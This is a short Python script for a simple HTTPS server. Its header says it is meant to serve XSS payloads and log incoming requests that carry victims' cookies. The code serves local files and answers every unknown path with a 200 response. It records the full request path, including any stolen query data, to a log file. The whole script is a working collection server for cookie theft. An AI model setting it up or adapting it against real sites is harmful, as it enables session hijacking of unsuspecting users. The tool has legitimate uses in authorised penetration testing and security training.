#!/usr/bin/env python3
#################################################################################
#                                                                               #
#  SimpleHTTPSServer                                                            #
#                                                                               #
#  A simple python HTTPS server that:                                           #
#  - Serves files in the current directory                                      #
#  - Logs all 404 requests to file.                                             #
#                                                                               #
#  The intention is to be used as a XSS web server that serves the payloads     #
#  then logs requests containing cookies etc.                                   #
#                                                                               #
#  Must be run with a cert.pem key in the running directory.                    #
#  Generate a cert with genKeys.sh                                              #
#                                                                               #
#  Usage: python3 SimpleHTTPServer.py <port>                                    #
#                                                                               #
#  Author: Jakob Pennington                                                     #
#  Version: 1.0.0                                                               #
#  Last modified: 27-11-2018                                                    #
#                                                                               #
#################################################################################
name = 'SimpleHTTPSServer'
version = '1.0.0'
tagline = 'A HTTP server with more S and logging.'

#####################
# IMPORTS
##################### 
from http.server import HTTPServer, SimpleHTTPRequestHandler
import os
import ssl


#####################
# FUNCTIONS
##################### 
class S(SimpleHTTPRequestHandler):
    # Return a 200 for all requests
    def _set_response(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    # Handle GET requests
    def do_GET(self):
        # If the file exists, serve it
        if ((self.path.split('?')[0] != '/logfile.txt') and os.path.isfile('.'+self.path.split('?')[0])):
            return SimpleHTTPRequestHandler.do_GET(self)
        # Else, return 200 and log request to file
        else:
            # Return 200
            self._set_response()
            # Write to log
            log_file = open('logfile.txt', 'a')
            log_file.write(self.client_address[0] + ' - - [' + str(self.log_date_time_string()) + '] ' + str(self.path) + '\n')

def run(server_class=HTTPServer, handler_class=S, port=443):
    # Set up server
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    httpd.socket = ssl.wrap_socket (httpd.socket, server_side=True,certfile='cert.pem')
    print("Serving HTTPS on port %s" % str(port))

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()


#####################
# MAIN
##################### 
if __name__ == '__main__':
    from sys import argv

    if len(argv) == 2:
        run(port=int(argv[1]))
    else:
        run()
